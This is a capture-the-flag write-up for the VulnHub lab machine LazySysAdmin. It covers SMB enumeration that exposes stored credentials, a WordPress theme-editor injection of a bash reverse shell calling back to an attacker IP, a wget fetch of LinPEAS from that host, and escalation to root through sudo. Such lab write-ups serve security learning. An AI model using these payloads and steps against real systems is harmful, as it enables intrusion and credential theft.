### LazySysAdmin VulnHub Challenge Writeup

## Overview

LazySysAdmin is a beginner-friendly VulnHub machine that focuses on SMB enumeration, WordPress exploitation, and basic privilege escalation techniques. This writeup covers the complete process from reconnaissance to root access.

## Reconnaissance

### Network Discovery

First, I performed network discovery to identify the target machine:

```shellscript
netdiscover -r 192.168.1.0/24
```

The scan revealed the target at `192.168.1.16` with MAC address `08:00:27:0e:43:79`.

### Port Scanning

Next, I conducted a comprehensive port scan:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.16 -p-
```

**Results:**

- Port 22/tcp: OpenSSH 6.6.1p1 Ubuntu
- Port 80/tcp: Apache httpd 2.4.7 (Ubuntu)
- Port 139/tcp: Samba smbd 3.X - 4.X
- Port 445/tcp: Samba smbd 3.X - 4.X
- Port 3306/tcp: MySQL (unauthorized)
- Port 6667/tcp: InspIRCd


## SMB Enumeration

### SMB Service Analysis

I used enum4linux-ng to gather detailed information about the SMB service:

```shellscript
enum4linux-ng 192.168.1.16
```

**Key findings:**

- Workgroup: WORKGROUP
- Computer name: LAZYSYSADMIN
- SMB shares discovered: IPC$, print$, share$
- The `share$` share was accessible without authentication


### SMB Share Access

I accessed the SMB share to explore available files:

```shellscript
smbclient -L //192.168.1.16
smbclient //192.168.1.16/share$ -N
```

**Discovered files and directories:**

- wordpress/
- Backnode_files/
- wp/
- deets.txt
- robots.txt
- todolist.txt
- apache/
- index.html
- info.php
- test/
- old/


### File Download and Analysis

I downloaded important files for analysis:

```shellscript
mkdir siteFiles
cd siteFiles
smbclient //192.168.1.16/share$ -N
# Used mget * to download files
```

**Key file contents:**

**deets.txt:**

```plaintext
CBF Remembering all these passwords.
Remember to remove this file and update your password after we push out the server.
Password 12345
```

**robots.txt:**

```plaintext
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/
```

**WordPress Configuration (wp-config.php):**

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
define('DB_HOST', 'localhost');
```

## Web Application Analysis

### Directory Enumeration

I performed directory enumeration on the web server:

```shellscript
gobuster dir -u http://192.168.1.16/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Discovered directories:**

- `/wordpress/`
- `/test/`
- `/wp/`
- `/apache/`
- `/old/`
- `/javascript/`
- `/phpmyadmin/`


### WordPress Enumeration

I used WPScan to gather detailed information about the WordPress installation:

```shellscript
wpscan --url http://192.168.1.16/wordpress --enumerate u --api-token [API_TOKEN]
```

**Key findings:**

- WordPress version: 4.8.1 (vulnerable)
- Theme: Twenty Fifteen v1.8
- Users discovered: Admin
- 87+ vulnerabilities identified
- Registration enabled
- Upload directory has listing enabled


## Initial Access

### WordPress Theme Editor Exploitation

Since I had discovered database credentials, I attempted to log into WordPress admin panel using the credentials found in the SMB share.

Successfully logged in with:

- Username: Admin
- Password: TogieMYSQL12345^^






I used the WordPress theme editor to inject a PHP reverse shell into the 404.php file:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.6/4444 0>&1'"); ?>
```

### Reverse Shell

I set up a netcat listener and triggered the reverse shell:

```shellscript
nc -lnvp 4444
```

Accessed the 404 page to trigger the shell:

```plaintext
http://192.168.1.16/wordpress/wp-content/themes/twentyfifteen/404.php
```

Successfully obtained a reverse shell as `www-data`.

## Privilege Escalation

### System Enumeration

I ran LinPEAS to identify privilege escalation vectors:

```shellscript
wget http://192.168.1.6/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Key findings:**

- Ubuntu 14.04.5 LTS
- Kernel: 4.4.0-31-generic
- Multiple kernel exploits available (CVE-2016-5195 DirtyCow, CVE-2017-16995, etc.)
- User `togie` found in `/home/`


### Password Discovery and User Switching

From the `deets.txt` file found earlier, I discovered the password `12345`. I attempted to switch to user `togie`:

```shellscript
python -c "import pty;pty.spawn('/bin/bash')"
su togie
# Password: 12345
```

Successfully switched to user `togie`.

### Sudo Privileges

I checked sudo privileges for the `togie` user:

```shellscript
sudo -l
```

**Result:**

```plaintext
User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

The user `togie` has full sudo privileges!

### Root Access

I escalated to root using sudo:

```shellscript
sudo /bin/bash
```

Successfully obtained root access.

## Flag Capture

With root access, I navigated to the root directory and retrieved the flag:

```shellscript
cd /root
cat proof.txt
```

**Flag:**

```plaintext
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851

Well done :)

Hope you learn't a few things along the way.

Regards,
Togie Mcdogie

Enjoy some random strings
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```

## Summary

The LazySysAdmin challenge demonstrated several key penetration testing concepts:

1. **SMB Enumeration**: Unauthenticated access to SMB shares revealed sensitive files
2. **Information Disclosure**: Configuration files and notes contained credentials
3. **WordPress Security**: Admin panel access led to code execution via theme editor
4. **Password Reuse**: The same password was used across multiple services
5. **Privilege Escalation**: Excessive sudo privileges allowed immediate root access


The challenge emphasized the importance of:

- Proper SMB share permissions
- Secure credential management
- WordPress hardening
- Principle of least privilege for user accounts


This was a straightforward beginner-level machine that focused more on enumeration and basic exploitation techniques rather than complex privilege escalation.
